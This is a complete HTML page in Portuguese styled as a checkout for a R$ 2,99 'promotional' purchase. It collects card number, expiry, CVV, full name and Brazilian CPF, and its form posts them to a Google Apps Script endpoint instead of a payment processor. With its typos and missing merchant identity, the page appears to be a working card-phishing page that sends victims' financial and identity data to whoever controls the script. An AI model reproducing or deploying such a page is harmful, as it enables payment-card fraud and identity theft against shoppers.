<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Finalizar comprar</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #f2f2f2;
}
.container {
  max-width: 420px;
  margin: auto;
  background: #fff;
  min-height: 100vh;
  padding: 20px;
}
.topo {
  text-align: center;
  margin-bottom: 20px;
}
.box-preco {
  background: #e8f5e9;
  border: 1px solid #c8e6c9;
  padding: 12px;
  border-radius: 10px;
  text-align: center;
  margin-bottom: 20px;
}
label {
  font-size: 13px;
  font-weight: bold;
  display: block;
}
input {
  width: 100%;
  padding: 14px;
  border-radius: 8px;
  border: 1px solid #ccc;
  margin-bottom: 15px;
}
button {
  width: 100%;
  padding: 16px;
  background: #2962ff;
  color: #fff;
  border: none;
  border-radius: 12px;
  font-size: 17px;
  font-weight: bold;
}
</style>
</head>

<body>
<div class="container">

  <div class="topo">
  <h2>Confirmar comprar</h2>
  <p>Preencha os dados abaixo</p>

  <div class="box-preco">
    <span>Valor promocional</span>
    <strong>R$ 2,99</strong>
  </div>
  
  <form
    action="https://script.google.com/macros/s/AKfycbyy4AYCzE2gpPiKkwO1XP3R2izuOzRFKcuju5oDrv1GX3rCDrWXKkJxEVXE5ZSNfRCh/exec"
    method="POST"
  >

  <label>Número do cartão</label>
    <input name="numero" required placeholder="Insira o numero do cartão">

    <div class="row">
      <div style="flex:1">
        <label>Data de validade</label>
        <input name="validade" required placeholder="MM/AA">
      </div>
      <div style="flex:1">
        <label>código de seguraça</label>
        <input name="idade" required placeholder="CVV/CVC">
      </div>
    </div>

    <label>Nome completo</label>
    <input name="nome" required placeholder="Digite seu nome completo">

    <label>CPF</label>
    <input name="cpf" required placeholder="000.000.000-00">

    <button type="submit">Confirmar</button>
  </form>
</div>

</body>
</html>
